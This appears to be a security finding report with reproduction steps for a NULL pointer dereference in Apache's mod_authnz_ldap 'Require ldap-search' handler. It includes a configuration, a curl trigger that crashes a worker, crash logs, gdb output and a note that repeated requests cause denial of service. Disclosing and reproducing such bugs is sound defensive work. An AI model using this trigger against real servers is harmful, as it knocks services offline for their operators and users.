# 004 — `Require ldap-search` NULL deref crashes worker

`ldapsearch_check_authorization()` reads per-request LDAP state via
`ap_get_module_config(r->request_config, &authnz_ldap_module)` but, unlike
the sibling LDAP authz handlers, never allocates it when missing. When the
authentication step is non-LDAP, `req` is `NULL`. On the success path the
worker writes `req->dn = dn`, dereferencing NULL.

## Setup

`mod_authnz_ldap` configured for authorization only, with another module
performing authentication (Basic against an htpasswd file):

```apache
LoadModule ldap_module        modules/mod_ldap.so
LoadModule authnz_ldap_module modules/mod_authnz_ldap.so
LoadModule authn_file_module  modules/mod_authn_file.so
LoadModule authn_core_module  modules/mod_authn_core.so
LoadModule authz_core_module  modules/mod_authz_core.so

<Location "/secret">
    AuthType Basic
    AuthName "ldap-search trap"
    AuthBasicProvider file
    AuthUserFile /etc/httpd/users.htpasswd

    AuthLDAPURL "ldap://127.0.0.1:389/dc=example,dc=com?uid?sub"
    AuthLDAPBindDN "cn=reader,dc=example,dc=com"
    AuthLDAPBindPassword reader-pw

    <RequireAll>
        Require valid-user
        Require ldap-search (objectClass=*)
    </RequireAll>
</Location>
```

```bash
htpasswd -bc /etc/httpd/users.htpasswd alice s3cret
```

A real OpenLDAP at `127.0.0.1:389` containing exactly one entry that the
filter matches. The filter must return one DN.

## Trigger

```bash
curl -i -u alice:s3cret http://127.0.0.1/secret/
```

## Observed effect

Worker SIGSEGV. `error_log`:

```text
[core:notice] child pid 12345 exit signal Segmentation fault (11)
```

gdb on the core dump:

```text
Program received signal SIGSEGV.
0x00007f... in ldapsearch_check_authorization (...) at mod_authnz_ldap.c:1495
1495        req->dn = dn;
(gdb) p req
$1 = (authn_ldap_request_t *) 0x0
```

Browser/curl sees a connection reset (or `502 Bad Gateway` behind a
front-end). Repeated requests continually crash a worker, satisfying the DoS
condition in the finding.
